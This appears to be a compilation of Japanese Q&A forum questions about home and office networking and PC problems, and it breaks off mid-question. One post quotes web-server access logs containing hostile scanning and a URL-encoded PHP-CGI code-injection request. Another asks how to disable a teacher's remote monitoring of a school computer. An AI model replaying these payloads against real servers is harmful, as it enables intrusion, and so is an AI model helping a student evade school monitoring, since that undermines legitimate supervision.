・ルータ管理画面で、よく分からない項目があるのですが、教えてください ■設定 WAN設定／WANポート／WAN側IPアドレス ・項目1 … 「DHCPサーバからIPアドレスを自動取得」 ・項目2 … 「PPPoEクライアント機能を使用する」 ・以下略 ■現状 ・「PPPoEクライアント機能を使用する」を選択しているのですが、ここを「DHCPサーバからIPアドレスを自動取得」へ変更すると、ネットへ繋がらなくなります ■質問1 ・なぜ変更すると、ネットに繋がらなくなるのでしょうか？ ・WAN側IPアドレスの「DHCPサーバからIPアドレスを自動取得」って何ですか？ ・LAN設定のDHCPサーバ機能は「使用する」にチェックを入れています。これは「割り当てIPアドレス」から指定台数だけIPアドレスを自動で割り振る機能だと思うのですが、これのWAN側バージョンはどういう意味なのでしょうか？　WAN側IPアドレスは接続が切れるたびプロバイダから任意のIPアドレスを渡されるだけだと思うのですが… ■質問2 ・「WAN側IPアドレス」＝「グローバルIPアドレス」でしょうか？ ■環境 ・フレッツ光 ・光電話なし ・ルータ利用(PC2台)
こんばんは、いきなりですが、まず解決したいところを三つ提示させていただきます (1)PS3でUPNP設定を有りにしたいのですが、設定をしても有りになりません。PS3でIPを固定し、 ルータでPS3のMACアドレスからIPを固定しDMZでそのIPを設定してもなしのままです 以前に設定した時は一度ありになったことがあります しかし、ルータのアップデートをしてから同じ設定をしても有りになってくれません (2)PS3のIPを固定したことによって無線LANのノートPCが一瞬だけIPアドレスの競合と出るようになりました 間隔が不規則で１０分毎にでることもあれば２，３時間でないこともあります この機器を使った時に出るという規則性がわからず原因がわかりません DHCPサーバを192.168.2.100～200の間に設定して全ての機器のIPアドレスを それ以外の所で固定しましたが、全く直る気配がありません ちなみに不思議なことにIPアドレスの競合が出てきてもネット接続が切れることはありません (3)PS3のCODゴーストをプレイしているのですが、１ゲームに１回はラグで止まることがあります （その場で皆が止まって、しばらくすると動き出す状態です。動き出すと変な位置にいたり死んでたりします） UPNPがありになってた時や、IPアドレスを固定していなかった時はそんなことがなかったので上記に原因があると考えています (1)PS3のUPNPをありにしたい (2)IPアドレスの競合メッセージを出ないようにしたい (3)ゲームのラグが起こらない状態に戻したい（PS3のIPを固定したまま） 以下が我が家のネット環境になります 回線フレッツ光OCN モデム<GE-PON-ONUタイプD> 　　　　　↓ ルータ<ELECOM・WRC1750GHBK>-----ハブ<Logitec・LAN-GSW08/PHB>----PC1(windows7) 　　　　　　　　　　　　　　　　　　　　　　＼　　　　　　　　　　　　　　　　　　　　　　　 ＼---PC2(windows7) 　　　　　　　　　　　　　　　　　　　　　　　＼---pc3 (windowsXP) 　　　　　　　　　　　　　　　　　　　　　　　　　＼ 　　　　　　　　　　　　　　　　　　　　　　　　　　＼--ハブ<Logitec・LAN-GSW03PSBE> 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　↓ 　　　　ブルーレイ(BD-W2300)---TV(SHARP・LC-60UD1)---／＼---PS3 無線LAN　●ノートPC1　●IPHONE3G　●IPHONE4S　●IPHONE5　●3DS 長文になってしまいましたが、詳しい方どうかよろしくお願いします
「Apple IE DAV は動作を停止しました」の対処法がわかる方、教えてください。 ここ数日前から表示されるのですが、ウイルス防止ソフトのようですが、どう 対処したら表示されなくなるかわかりません。 スペックは以下の通リです。 OS：　Windows7 表示されるタイミング：　起ち上げ時 自分でしたこと：「オンラインで解決策を確認してプログラムを終了する」を選択 　　　　　　　　　　→何も表示されなくなるが次の起ち上げ時に再び表示される。 「問題の詳細」を見ても理解できないです。 気になる変化：動画を見ているときに急に止まり、スタートボタン以何をクリックしても反応しなくなる頻度が多くなった。そういう場合は再起動するが1時間ほどでまた止まってしまうこともあれば数日は大丈夫なこともある。 どなたか、対処法がわかるかた、教えてください。
PCだけならAd Blockなどを設定したりhostsの書き換えだけで対応できるのかもしれませんが iPod touchなども脱獄せずに広告を除去したいのでとりあえずルーターのパケットフィルタの 設定からIPアドレスを指定していくつかの広告は除去できました。 ルーターにURLフィルタリングの機能があれば簡単に設定できるのですが、Atermなので IPアドレスでしか登録できません。 nslookupでドメイン名を入力してIPアドレスを調べたのでいくつかの広告は的外れのIPアドレスを 指定してしまっていました。 ブラウザでサイトを開いたときに読みこまれる広告のIPアドレスを調べたいんですが どのような方法がありますでしょうか？ パケットキャプチャリングソフトなどで詳しく確認できたりするんでしょうか？ よい調べ方があればご紹介お願いします。
・ローカル環境のWindows7に、ルータ経由でフレッツ光回線接続しています ・常時接続しているのですが、数時間に一回ぐらいの割合で、WAN側のグローバルIPアド レスが変わります ■ローカル側 ・この切り替わったタイミングで、Windows7にある指定ファイル(「.htaccess」「config.php」)にあるIPアドレス値を書き換えたいのですが、可能でしょうか？ ■サーバ側 ・もしくは、このタイミングで、借りているVPSサーバーへ自動アクセスして指定ファイル(「.htaccess」「config.php」)を書き換えることは可能でしょうか？ ・WAN側のグローバルIPアドレスの変更を、AJAXのように随時検知して、ファイルを書き換えるアクションがもし可能なら、その方法を教えてください ・ルータとかにそういう機能はあるのでしょうか？ ・もしくは、コマンドで何かする？ ・あるいは、Windowsのサービス処理か何か？
TCPのコネクションを解放するときの手続きについて、 フラグの意味がわからない部分があります。 A────────B 　→FIN,ACK→→→　　　(1) 　←←←←←ACK←　　　(2) 　←←←FIN,ACK←　　　(3) 　→ACK→→→→→　　　(4) 上記の手続きにより、コネクションの解放が完了しますが、 (2)は(1)に対しての肯定応答だとわかるのですが、 (3)のACKの意味がわかりません。 何に対して応答しているのでしょうか？ Bは2連続でACKを送っている理由、決まりがわかりません。 RFCには「FINとセットでACKを送らなければならない」とは書いていませんので、 決められたものではないと解釈しております。 では、なぜFINとセットでACKを送るかがわかりません。 (1)のACKについては、今までのやり取りに対するACKと解釈しており、 問題視しておりませんが、ここの解釈が間違っていたら訂正お願いします。
恐れ入ります。 いままで、ネットワークのセグメントを分割する場合、単純にローカルルータで行ってきました。 今回環境や、コストの絡みから、タグVLANを検討しています。 実運用上の違いや、動作的にローカルルーター使用時と比べて、どうでしょうか？ 時間があまりないのでどうぞよろしくお願いします。
Twitterのプロフィールのヘッダーの部分が設定してもその画像になりません。 アプリでやってもアプリではなく、普通にネットでやっても適応されません。 ネットの方で設定の部分にバナーがいいえになっていますが、それが原因なんでしょうか？ ヘッダーを設定したいです(；＿；)
ファミリータイプ光回線のネットワーク接続方法について教えてください ■環境 ・Windows7 ・ルーターは、コレガを利用 ■前提1 ・ルーターを介さないと正常接続 ・ルーターを介した時だけ「フレッツ簡単セットアップツール」でも「ルータ管理画面」からでも接続エラーとなる ■前提2 ネットワーク接続フォルダ内容 ・インターネット接続 … WAN Miniport(PPPOE)。チェックあり ・エリア内速度測定サイト(IPv4) … WAN Miniport(PPPOE) ・サービス情報サイト(IPv4) … WAN Miniport(PPPOE) ・ローカルエリア接続 … ネットワーク Intel(R) ■質問 ・以前作成した「ローカルエリア接続」を試しにクリックしてみたら、無事ネットに繋がりました ・何故でしょうか？ ・「フレッツ簡単セットアップツール」や「ルータ管理画面」から、この設定は出来ないのでしょうか？ ・PPPOEって何ですか？ ・接続エラーになったのは、何時の間にか「既定の接続」が切り替わっていたからのようにも思うのですが、いつどこで切り替わったのでしょうか？
２０13.10月公開の更新プログラムをインストールをした後に、再起動をしてからスクリーンセーバー（１０分後に設定）になってから、パソコンを使おうとするとブルースクリーンになり、再起動してしまいます。 不具合を起こす更新プログラムか何かがあるんでしょうか？
マイクロソフトとの契約更新で必要なURLだが、OS：WinXP、IE(IE8)で下記のリンクに アクセスすることが出来ません。(Internet Explolerではこのページは表示できません) Win7だとアクセス可能です。 ネットワークは正常に接続出来ています。 https://vsipprogram.com/Partner/Contact/859 https://vsipprogram.com/Partner/Renew/203 OSの移行は行わず、IEでアクセスする方法を教えて頂けますでしょうか。 下記実施済みだが現象変わらず。 http://support.microsoft.com/kb/956196/ja ・SSL 2.0チェック外す ・ブラウザーの履歴を削除 ・Internet Explorer のアドオンを無効にします。 ・Internet Explorer をリセットします。 ・サード パーティ製のサービスまたはプログラムが Internet Explorer と競合しているか確認 ・PC を以前のポイントへの復元
こんにちは。 自社でサーバを運用し、複数のサイトからメールマガジンを発行する予定です。 そこで、スパムとして弾かれないようにSPFの設定を行いたいのですが、具体的な手順が分かりません。 プライマリサーバは　ns1.xxxxx.jp で、メールを送信するとメールヘッダのRecieved：のfrom欄にはこのドメインが記載されます。 しかし、実際にメールのfromに設定しているのはaaa@yyyyyy.jpなので、gmailなどでは受信ができません。 yyyyy.jpの方のドメイン管理画面で　includeすることで設定は可能なんだろうな、というところまではわかりましたが、そもそもincludeするためのns1.xxxxx.jp部分のSPFの設定の仕方が分かりません。 的を得ていない・カテ違いの質問でしたら申し訳ありませんが、よろしくご教授のほどお願いいたします。
公開鍵暗号を使用するため、gnuPGをダウンロードしたのですが、コマンドプロンプトで確認すると、 ’gpg’は、内部コマンドまたは外部コマンド、 操作可能なプログラムまたはバッチ　ファイルとして認識されていません。 と表示されます。 正しくダウンロードできていないのでしょうか。
最近自宅にてdebianでwebサーバーを公開し始めました。 サイトは昔の部活仲間や友達内だけの小さなサイトです。 当初からapacheのaccess.logのログをみて、 さまざまな国からアクセスがあったことを知って戦々恐々としています。 自分のできる対策として.htaccessで日本のIPのみアクセスを許可したり、 sshのポートを変更し、公開鍵認証のみにし、rootログインも禁止したりしました。 ポートは80番とsshのみ開けています。telnetは消しました。 cronでaptitude updateとupgradeを毎日自動でやるよう設定しました。 これでだいぶ国外からのアクセスが減ったのですが、 まだこのような良くわからないアクセスがaccess.logに残ります。 これらについて教えてください。 ----------------------------- 74.7.65.34 - - [07/Dec/2013:23:29:47 +0900] "\x80w\x01\x03\x01" 403 278 "-" "-" 74.7.65.34 - - [07/Dec/2013:23:29:47 +0900] "GET /HNAP1/ HTTP/1.1" 403 503 "http://114.188.50.107/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)" ----------------------------- 1-163-194-59.dynamic.hinet.net - - [07/Dec/2013:23:32:59 +0900] "CONNECT mx0.mail2000.com.tw:25 HTTP/1.0" 403 490 "-" "-" 61-228-90-61.dynamic.hinet.net - - [08/Dec/2013:01:42:04 +0900] "CONNECT mx2.mail2000.com.tw:25 HTTP/1.0" 403 490 "-" "-" 61-228-23-159.dynamic.hinet.net - - [08/Dec/2013:04:15:29 +0900] "CONNECT mx0.mail2000.com.tw:25 HTTP/1.0" 403 490 "-" "-" ----------------------------- 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:39 +0900] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 403 490 "-" "ZmEu" 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:39 +0900] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 403 481 "-" "ZmEu" 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:40 +0900] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 479 "-" "ZmEu" 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:40 +0900] "GET /pma/scripts/setup.php HTTP/1.1" 403 476 "-" "ZmEu" 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:40 +0900] "GET /myadmin/scripts/setup.php HTTP/1.1" 403 479 "-" "ZmEu" 20.254.52.119.adsl-pool.jlccptt.net.cn - - [07/Dec/2013:18:52:41 +0900] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 403 479 "-" "ZmEu" ----------------------------- 189.25.210.226 - - [08/Nov/2013:21:47:01 +0900] "-" 408 0 "-" "-" 95.39.62.79 - - [09/Nov/2013:03:46:42 +0900] "\xb7\xda\x84" 501 294 "-" "-" 91.79.51.155 - - [11/Nov/2013:16:05:26 +0900] "\xf7\xa1\xb5K\xa4Q\xd5\x14\xd6\x886{A\xec\xd5\xd2\xbb\x93Z\x04l\xf8\x19" 501 314 "-" "-" 93.174.93.69 - - [29/Nov/2013:02:57:31 +0900] "GET /invoker/JMXInvokerServlet HTTP/1.0" 404 505 "-" "-" 221.122.80.105 - - [25/Nov/2013:09:41:08 +0900] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 495 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25" ----------------------------- 相手のIPまんまですが 一つ目の「74.7.65.34」のアメリカからのアクセスの "\x80w\x01\x03\x01" 403 278 "-" "-" の「\x80w\x01\x03\x01」はいったいなんですか？ 二つ目の台湾からのアクセスについてわかることを教えてください。 あと自分は初心者ではっきりとはわからないのですが、 三つ目のアメリカからのアクセスは明らかに悪意のあるような気がしますが、 わかることを教えてください。 四つ目の5つは古いログであまり対策がとられていなかったころのものですが、 「"-" 408 0 "-" "-"」「"\xb7\xda\x84"」なの意味がわからないのですが、 これらは悪意のあるアクセスですか。わかることを教えてください。
IBMのSNAについて調べています。 SNAはOSI7階層モデルの元になったくらいのもので 綺麗にレイヤー分けされていると聞いたので、 X25+HDLCをかじったことのある私は SNAの各レイヤーのフレームフォーマットと値域設計も ググれば簡単に調べがつくとたかをくくって いました。 データリンク層のSDLCについてはすぐ調べがついたの ですが、その上のネットワーク制御層？について調べ初め たところとたんに暗中模索が終わらなくなりました。 TCと呼ばれている？ ACTPU, ACTLU, BIND, SDT, はTCレイヤー？ その他は？ それぞれのフォーマットと値域は？ 疑問が止まりません。 どなたか助け船宜しくお願いいたします。
RegClean Proを削除したいです。これのショートカットキーをゴミ箱に捨て、さらにゴミ箱も空にしました。でもPCを起動する度にこれの画面がでます。方法を調べると、アンインストールすれば良いとあります。説明の通りにプログラム検索で「RegClean Pro」を入力しましたがその名前が出てきません。どうしたらアンインストール出来るのでしょうか。教えて下さい。
質問致します。 母屋（木造）内にルーターがあるのですが、その無線を 離れでも受信をする為に、何を用意したら良いのでしょうか？ 調べてみるとLANケーブル線に変更して接続するなどありましたが ケーブルを伸ばす事は道路を挟んでいるので出来ません。 何か良い知恵があれば教えて下さい。
ネットにつながっていない状態のPCをルーターをかいした二つのネットワークでルーティングしたとします。 そのルーターをかいした二つのネットワークかんで直接的なファイルのやり取りをする方法があったと思ったのですが思い出せません。結構初歩的だったはずなのですが思い出せません。 PC-ルター-PC での直接のファイルのやり取りです。
僕は以前までUQWiMAXの無線LANを契約してルーターで使っていました。 しかしiPhone5sでテザリング機能を設定したので実質必要なくなり、契約を解除しました。 なのでルーターは使わなくなりました。 そこでこのまま捨てるのはなんかもったいない気がして、ルーターには電波を拾って、電波を周囲に発する機能はついていると思ったので改造したいと思ってます！ まぁ、遊び程度なんですが、初心者でも改造で電波を拾うことはできるのでしょうか？ もしできるのであれば詳しい方法を教えて頂きたいです！！ そんなに詳しくないのでもし、違法なことであったら指摘お願いします。
某中堅企業でIT部門へ部署異動になった IT初心者の者です。 先日の打合せにて、 社内のコールセンター（顧客対応用）を新規に開設する運びとなり、 役員より以下の話題が出ました。 ※別途、コールセンター自体のシステムは、 　専用の会社にシステム構築を依頼する予定です 1.コールセンターのFAXの内線化、外線化それぞれのメリット・デメリットとは？ 2.コールセンターから自動でFAXを送付したい 3.1.2をセキュリティーとコストも含め検討して欲しい 私なりにインターネットや本で調べましたが、 上記に関する事柄があまり見つけられなかったのが現状です。 また、同じ部署の先輩達も、 「やばい。さっぱりわからん！」 との事。。。 現時点での私のわかった範囲は以下となります。 。。 1.について 　内線・・・専用回線の費用が発生 　（帯域が何とか。。。） 　外線・・・通常のFAXと変わらず 2.について 　自動化・・・別途システムを構築が必須 ※金額が載ってない 　非自動化・・・システム構築は必要無し（手動FAX） 3.について 　内線・・・コスト高、セキュリティー高 　外線・・・コスト低、セキュリティー低 　自動化・・・コスト高、セキュリティー高 　非自動化・・・コスト低、セキュリティー低 大変申し訳有りませんが、 私がわかっている上記記載以外の事項で 何か付け加えることがありましたら、 助言をお願い致します。 ※間違っていれば、指摘もお願いします！ 最終的にはマトリクス形式の表にして 役員に説明をする予定です(T_T) 大変に申し訳有りませんが、 どうぞよろしくお願い致します。
こんにちは、 Windows７機にて、同じネットワークのWindowsVista機(\\VISTA)に接続されたプリンタに データ(c:\DATA\print_out.txt)が送れずに困っています。 Vista機側でプリンタ共有を設定し共有名(PRINTER)を付けます、 ７機側にてコマンドプロンプトで、 copy "c:\DATA\print_out.txt" "\\VISTA\PRINTER" と入力すると、「アクセスが拒否されました。」が返ります。 フォルダに対するファイルコピーやDIRコマンドは受け付けるので、 相手が共有プリンタの場合だけです（今のところ）。 同じ事をXP機で行うと動作しますが、 ７機に共有プリンタを設定した場合はVISTA機と同様にエラーになります。 どなたか教えて頂けませんでしょうか？ よろしくお願い致します。
Outlookのメール機能で、クイック送信でチームに送信や上司に送信がありますが、間違ってクリックした場合誰かに一斉送信されますか？ アドレスグループ未設定の場合勝手に保有アドレス全件に送信になりますか？送信されていれば、メールの送信済みBOXにメール送信がされたかどうかわかる様に入りますか？送信済みメールを開いた時に間違ってクイック送信ボタンを押してしまい困ってます。送信済みBOXを確認しましたが、メールは新たに送信済みBOXには増えてませんでした。誰か大変お手数ですが教えて下さい。
突然PCデスクトップ右下にこんな警告らしき画面が現れます。PC立ち上げると必ず出ます。 四角い囲みの中に、 　！ Reminder Your computer is Not Backd Up, backup Your Files Online Today. FREE Computer Backup Available. Backup Now これって安全なんでしょうか？何処が発信元か分かりません。それも英語だから理解不能です。 この画面が出なくする（消す）方法を教えてください。よろしくお願いします。
現在、外部のレンタルサーバーでMySQLサーバーを動かし、そのDBに、VPNを介してインターネットを通してやり取りする専用の業務アプリを作り、そのアプリで様々な業務上の作業を行っています。 そこで、ふと思ったのですが、この外部のサーバーとのやり取りはMySQLとの通信だけです。VPNを利用する意味はあるのか？と思いました。 ファイルサーバーやアプリケーションサーバーなどいろいろな用途に使われる場合は、通信のプロトコルやポートなど様々なので、すべてを包括的にトンネル化するVPNが有用だと思いますが、例えば、特定のプロトコルでしか通信しない場合、そのプロトコルで暗号化されていれば、問題ないのかな？と考えました。 実際どうなんでしょうか。 もちろん、接続を開始する段階の「認証」は別で考える必要がありますが。 詳しい方、よろしくお願いします。
初めまして、中一の女子です。 今回質問させていただく内容は、学校のPCについてです。 いつも、PCを使う時に遠隔操作で先生が操作しています。 私の後ろの男子は遠隔操作を解除しています。 なので、私も解除したいんですがやり方がわかりません。 ロックのやり方はわかりました。 Windowsマークを押して、Lを押したら出来ました。 だけど、解除のしかたはわかりません。 教えて頂けたら幸いです。 ちなみに、学校のPCはWindows７です。
ウィンドウズXPのウィルス感染の危険性が指摘されているようですが、自分がどのタイプのwindowsを使っているかわかりません。 ＶｉｓｔａのシールがPC本体に付いているということは、このPCがXPではない、ということを指していますか？ PCのことに全く詳しくないので、初歩的質問ですが、どうぞよろしくお願いします。
公開鍵と秘密鍵を新しく差し替える場合どうしますか？ 新しいPCで作業するときにPCの名前を変更したついでに公開鍵と秘密鍵を新しく作成しようかと思ったのですが 差し替え方法がわからなかったので質問させていただきます それとも個人で使ってるレベルだったらわざわざそこまでせずに以前使っていたものを使いますか？ みなさんが新しく作業PCを買い替えた時にどうしているか気になります たくさんの回答お待ちしております
よろしくお願いします。 300台のPCが繋がるLANがあり、16ビット(255.255.0.0)でサブネット化されています。 そのLANに今度600台のPCを追加する予定です。 IPアドレスの数は問題無いのですが、通常この程度のPC台数で16ビットマスクを使用するものか分かりません。 21ビットマスクでもIPの数は足りますし、もっと細かくしてビルのフロア毎に分ける事も可能と思います。 どのようにサブネットを決定して行くものなのか分からないのでアドバイス下さい。 また、現在のサブネットで発生しうる問題等ありましたら教えて下さい。 (問題無いのであればいじりたく無いと思っています) 補足 ・PCは主拠点に集中しています。主拠点はビルでPCは複数フロアにあります ・広域イーサで接続されたいくつかの拠点に少数のPCがあります
2004年に発売したノートパソコンpqe102jcdtを貰ってインターネットに繋げたいのですがやりかたがわかりません。環境はEMOBILEのポケットWi-Fi GL06のみです。メーカーに問い合わせたらこれはWi-Fi内臓されていないのでEMOBILEポケットWi-Fiとノートパソコンを繋げるなんかを購入したら？多分出来る？みたいな返事でした。 フラッシュメモリー買えば出来るのか悩んでいます、EMOBILEのなにを買えばいいのか、簡単に初心者でも出来そうなのか。どなたかお願いします！
教えてください。 1台のPCが、あるAネットワークを通ってインターネットへ出て行くのに そのネットワークにルータをつないで、NAT変換して出て行けるようにしたいです。 ルータでどのように設定すれば良いでしょうか？ 静的NAT(？1対1のNAT?)と言われるような設定をするのでしょうか？ YAMAHAのルータでコマンドラインでできれば設定したいです。 PC１IPアドレス：192.168.11.1/24 ルータPC1側インターフェースIPアドレス：192.168.11.254/24 ルータPC2(Aネットワーク側インターフェースIPアドレス：10.10.0.100/16 よろしくお願い致します。
社内のMac Pro(15台）をネットワークを組み それぞれデータの受け渡しができるよう 構築しようと考えております。 内1台のMac Proだけ データ共有サーバーとして またこのMac Proのみ 外部にデータを送るために インターネット接続ができるようにしたいのですが （他14台はデータの受け渡しのみ、インターネット接続不可にする） このような場合、それぞれ どのような設定が必要でしょうか？ またハードやソフトが別途必要でしょうか？ サーバーに使用としているMacはOS10.6 その他14台はOS10.5～6の混在です。 お手数ですが 宜しくお願いします。
※ サーバー管理のことはほとんど分かっていません。 ※ 質問の仕方自体があやふやだと思いますが、よろしくお願いいたします。 ホスティング業者でサーバを借り、rootアカウントで初めて sftp (ssh)接続をする際ですが、サーバ側の鍵をsftpソフトが受け入れます（ユーザに確認を求めますが）。結局 rootのアカウント名とパスワードだけで接続できてしまいます。 （１） この「鍵」の意義はなんでしょうか？あってもなくてもアカウントとパスだけで接続できてしまいますし・・・。 つぎに、この状態でしばらく sftpを利用していたのですが、ある日突然「このサーバの鍵は、以前認証した鍵と異なります。鍵の変更があったかサーバ管理者にお問い合わせください」とのようなメッセージが出ました。実際サーバ管理者に問い合わせることもできますが、彼自身よく分かっていないのか、あやふやです。 （２） そこでお聞きしたいのは、鍵が定期的に自動で刷新されることはあるのだろうか？ということです。もしあるなら参考URLや、検索キーワードを教えていただけると助かります。rootアカウントを閉じて別アカウントで公開鍵と秘密鍵を作った場合は、自動的な更新はないとのことです。これは素人の私でも「そりゃ接続できなくなってしまうし当然かな」とは思いますが、rootの場合はどうでしょう。 問題が頻発しサーバ管理者の話を信用しかねていたところ、sftpソフトが改ざんの可能性にも言及しており、少々焦っております。rootを早く閉じればよいのですが、こちらもゴタついていまして・・・。以上２点よろしくお願いいたします。
こんばんは ＶＮＣを利用してＰＣ画面上にアンドロイドの画面を表示しているのですが、つながるwifiとつながらないwifiがあります。 下記のような構成です（棒線は有線、点線は無線をあらわしています） 光回線モデム 　｜ ルーター（A t e r m B L 1 9 0 H W）-PC（デスクトップ) 　｜ AU HOME SPOT CUBE（無線アクセスポイントとして利用）　・・・・　Android端末 au home spot cubeには複数のSSIDがあり、WPA2でセキュリティ保護されたネットワーク（仮に1番とする）、WEPでセキュリティ保護されたネットワーク（仮に2番とする）があります。 android端末を1番のネットワークでwifiをつなげた時はVNCとつながるのですが、２番のネットワークでwifiをつなげた場合はconnection timed outになってしまいます。 原因は何なんでしょうか？
　長年ソフト会社にてシステム開発をしてきており、現在社内ＳＥとして働いて数年経ちますが、ネットワークに関しては、全くわからない状態です。 　そもそも開発していた時、ネットワークに関しては、メーカかユーザの作業範疇であったため、何らタッチする事がありませんでした。言われたＩＰアドレスを利用するというくらいなものです。 　 　メーカやユーザのネットワークまで構築されるプロジェクトに参加されてきた方なら、学べる下地は会社で用意されているでしょうが、ユーザサイドの方は、どのようにして学ばれているのでしょうか？。 　 　ルータを自費で購入する余裕はありません。ＰＣを複数買うのも余裕ありません。会社側で余計にルータを買う余裕もなく、情報システム部門がなく総務部門の中におりますので、承認も当然おりませんし、試験的に構築して学べる環境でもありません。　 　 　私が来るまでは、ベンダ任せにしてたそうで、何故そういう構築をしたかの経緯も仕様書もありません。ＩＰアドレスの振り分けも、社員に入れ替りが激しいので、前職者のＰＣをそのまま利用したり、増員の場合は、空きＩＰを設定する程度の作業です。 　そもそもなんで、１９２．１．１０．ＸＸでルータ設定しており、拠点も第三オクテットを１１，１２・・・としているのかもわかりません。ルータでそう設定しているからなんだろうなあ程度です。また、ＮＴＴのＶＰＮサービスを利用してるようですが、当時の担当者はおらず、下請けだった業者ももういないとかで聞く事ができません。別のベンダに見てもらう事は出来ますが、中小ですので、どうせなら私の方でやりたいのですが（ＣＩＳＣＯのルータを使ってますが、ログインＩＤがわからないため、こちらでは何もできない状況でもあります。ログインＩＤ情報等は、ＮＴＴが開示してくれないのでＣｏｎｆｉｇも取れません）。
不思議なことが起こりました。 ある企業のお問い合わせページに 名前とメールアドレスを打ち込むと なんと住所まで、番地まで表示されるのです。 　Chrome Autofill　Setting という表記が出てくるのですが、これはいったいどういうことなんでしょうか？ おそらく過去に打ち込んだ記録を呼び出してきていると思うのですが、 CCｌeanerで記録は毎回のように消しているのですが（フォームへの入力履歴、保存されたパスワードは消してません。） 　まさかメールアドレスから住所が割り出されているようで気持ち悪いです。 ブックオフの一般のお客様　お問合で窓口です。 調べて見て下さい。
親に内緒でipodtouchって買えると思いますか？ 私ゎ持ってるんですけど友達がそれに悩んでいて・・・（羨ましくなったそうで） それで親に内緒で買いたいと言っているんですけど・・・・ 買えると思いますかね？ipodtouchわ、一番安いので何円くらいなんですか？ あと一番良い隠し場所とかありますか？
インターネット越しのルーター間のVPN接続を実現しようと思ったら、 VPNルーターと呼ばれるルーターを探せばいいのでしょうか？ つまり、インターネット経由で別セグメントにアクセスできるようにすることです。 （ソフトウェアVPNを使用しないで実現したい） 例：PC - ルーター - インターネット - ルーター - プリンタ
ブラウザ閲覧中に、一瞬ネットに繋がらなくなりました アレ？ と思っていたら、「ケーブルが接続されてません」とのポップアップが… ところが、2秒ぐらいしたら、すぐにネット閲覧できるようになりました ただ、ちょっと気になったので、念のためIPアドレスを確認したら、変更されていました ■質問 ・IPアドレス変更要件は、(PCやルータ)電源を入れ直すか、コマンドで何か打つ、だと思っていたのですが、普通にブラウザ閲覧しているだけでも変更されることはあるのでしょうか？ ・今回のケースでは、回線障害が起こって、ルータ電源を入れ直したのと同じことが起こったということでしょうか？ ・通常ブラウザ閲覧しているだけでは、IPアドレスは変わらないという認識で合っているでしょうか？ ■環境 ・自宅で光ファイバー接続 ・有線ルーター(BBR-4HG)にPC2台
教えて下さい。 一般的に、メール等の出口はファイアーウォールで、インターネットの出口はプロキシ という形かと思われますが、プロキシを経由しないでファイアーウォールからインターネット へ出た場合、何か障害となる事はあるのでしょうか？ また、機種等によるかと思われますが、必ずプロキシ経由としたい為、ファイアーウォール でインターネットへの出口を塞ぐ事は可能なのでしょうか？ 初歩的な質問で申し訳ありませんが、よろしくお願いします。
通信設備のない地域でパソコンを使用して、インターネットの接続を予定しております。 方法として、衛星電話を購入して接続し、衛星電話を介してインターネットをつなぐ予定です。 購入予定のパソコンと衛星電話のURLを記載いたします。 「http://store.shopping.yahoo.co.jp/atex/xrobotrap …」 「http://www.jdc.ne.jp/iridium_9505A.html」 上記のパソコンと衛星電話で問題はありませんでしょうか？ よろしくお願いいたします。
不定期でインターネット接続できなくなります。 その場合、ルーターの電源を入れ直して、10秒程待つと直ります。 なぜ、ルーターの電源を入れ直さなければいけないのでしょうか？ ※ルーター(BBR-4HG)の電源ランプに異常はありません ※回線は光ファイバーです ■質問 ・停電以外で、ルーターの電源を入れ直さなければいけないケースとしては、何が想定されるでしょうか？
ネットワークがちょっと遅くなった気がしたので原因を突き止めようとしました。 tracertコマンドを実行したところ -------------------------------------------------------------------- C:\Windows\system32>tracert google.com google.com [173.194.126.168] へのルートをトレースしています 経由するホップ数は最大 30 です: 1 * * * 要求がタイムアウトしました。 2 6 ms 8 ms 15 ms 192.168.6.137 3 6 ms 9 ms 6 ms 192.168.180.13 4 14 ms 11 ms 8 ms 10.0.0.17 5 10 ms 16 ms 17 ms 118.155.202.25 6 10 ms 12 ms 12 ms otejbb205.int-gw.kddi.ne.jp [59.128.7.129] 7 15 ms 17 ms 35 ms ix-ote210.int-gw.kddi.ne.jp [106.187.6.98] 8 22 ms 14 ms 25 ms 203.181.102.94 9 12 ms 20 ms 12 ms 209.85.249.195 10 12 ms 17 ms 12 ms 209.85.244.69 11 10 ms 11 ms 11 ms nrt04s06-in-f8.1e100.net [173.194.126.168] トレースを完了しました。 -------------------------------------------------------------------- と表示されました。 IPアドレス10.0.0.7への接続は調べたところ、どうやらプロバイダに接続しているようなのですが、それまでの 1 * * * 要求がタイムアウトしました。 2 6 ms 8 ms 15 ms 192.168.6.137 3 6 ms 9 ms 6 ms 192.168.180.13 の部分が気になります。 調べてみてもTTLが１のとき要求がタイムアウトするようなサンプルは見つかりませんでしたし、192.168.6.137の部分もどこに接続しているのかわかりません。 pingには応答しませんでした。 ネットへの接続環境ですが 